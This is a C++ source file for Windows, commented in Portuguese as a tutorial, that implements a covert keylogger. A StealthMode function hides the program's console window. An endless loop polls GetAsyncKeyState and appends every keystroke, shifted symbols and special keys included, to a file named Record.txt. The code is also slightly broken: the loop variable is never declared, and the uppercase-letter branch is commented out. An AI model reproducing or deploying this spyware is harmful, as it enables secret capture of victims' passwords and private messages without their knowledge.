/*
Biblioteca basica c++

<fstream> possibilita: Buffer de fluxo interno/ Executa operações de entrada/Saída no arquivo ao qual está associado
*/
#include <iostream>
#include <ctime>
#include <fstream>
/*
Biblioteca SO Windons

<windows.h> possibilita: Criar janelas e botões/ Enumerar arquivos de um diretório/
Consultar informações sobre o sistema(eg processos, serviços, janelas).

<winuser.h> possibilita: Troca de dados/ Caixa de diálogo/ Entrada de teclado e mouse
Gerenciador de janelas da área de trabalho(DWM)
*/
#include <windows.h>
#include <winuser.h>

using namespace std;

void StealthMode();
void StartLogging();

int main(){
    StealthMode();
    StartLogging();
    
    return 0;
}

void StartLogging(){

    /*
    Os dois pontos e vírgulas entre parênteses especificam que o loop é infinito, ou seja, está configurado para ser executado continuamente sem cessar.
    */
    for(;;){

        /*
        loop aninhado cujas condições especificam o intervalo de caracteres que o programa poderá ler. Este intervalo de caracteres é obtido a partir dos códigos ASCII. Não é necessário carregar a tabela ASCII na cabeça, basta fazer referência a ela pela internet.
        */
        for(c=8;c<=222;c++){
            /*
            é uma declaração nova para nós, porém não é nada complexa. Isso é chamado de função de interrupção do sistema. O que ele simplesmente faz é observar se um usuário de computador digita alguma coisa em seu teclado.
            */
            if(GetAsyncKeyState(c)==-32767){
            
            /*
            entre parênteses, o aplicativo ios :: especifica que não queremos que nosso arquivo seja -escrito toda vez que alguém pressiona uma tecla. Se não especificarmos isso, cada vez que um usuário pressionar uma tecla, o arquivo será aberto novamente e tudo o que foi escrito anteriormente será sobrescrito pelo novo conteúdo.
            */
            ofstream write("Record.txt", ios::app);
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                /*
                write<<c;
                write.close();
                break;
                */
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    case VK_SPACE:
                        write<<" ";
                        break;
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"<TAB>";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
                    
                    default:
                        write<<c;


                
            }
                
                }
           
           }
        }
        }
}

void StealthMode(){
    /*
     HWND -> representa uma janela para o sistema operacional e é um valor de ponteiro opaco. Ou seja, você pode saber o valor de um determinado HWND, mas não sabe nada sobre os dados que sustentam esse valor.

     declarando um identificador de janela.
     */
    HWND stealth;
    /*
    Um processo pode ser associado a apenas um console, portanto, a função AllocConsole falhará se o processo de chamada já tiver um console. Um processo pode usar a função FreeConsole para se desanexar do console atual. Depois, ele pode chamar AllocConsole para criar um console ou AttachConsole para se anexar a outro console.

    Aloca um novo console para o processo de chamada.
    */
    AllocConsole();
    /*
    Recupera um identificador para a janela de nível superior cujo nome de classe e nome da janela correspondem às strings especificadas. Esta função não pesquisa janelas filhas. Esta função não executa uma pesquisa com distinção entre maiúsculas e minúsculas.

    Encontre o identificador de janela com o nome de classe "ConsoleWindowClass".
    */
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    /*

    Define o estado de exibição da janela especificada, e esconda isso.
    */
    ShowWindow(stealth,0);
    
}